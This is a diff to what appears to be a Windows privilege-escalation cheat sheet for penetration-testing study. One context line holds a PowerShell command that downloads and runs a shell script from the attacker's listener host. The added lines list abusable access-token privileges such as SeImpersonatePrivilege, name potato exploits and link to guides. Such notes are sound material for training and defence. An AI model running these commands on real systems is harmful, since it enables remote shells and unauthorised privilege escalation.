@@ -534,6 +534,18 @@ Set up a new listener on local Kali, and get a new PowerShell session from remot
 ```Start-Process -FilePath “powershell” -argumentlist “IEX(New-Object Net.WebClient).downloadString(‘$LHOST/shell.ps1’)” -Credential $newCred```
 
 
+**Privilege Escalate by abusing Access Token** with ```whoami /priv```
+
+What is Access Token: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/access-tokens
+
+Check if any of these access tokens are enabled:
+
+SeImpersonatePrivilege: can be exploited with rottenpotato, juicypotato
+SeAssignPrimaryPrivilege: can be exploited rottenpotato, juicypotato
+SeBackupPrivilege: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
+etc.
+
+
 https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#privilege-escalation
 https://butter0verflow.github.io/oscp/OSCP-WindowsPrivEsc-Part1/
 https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
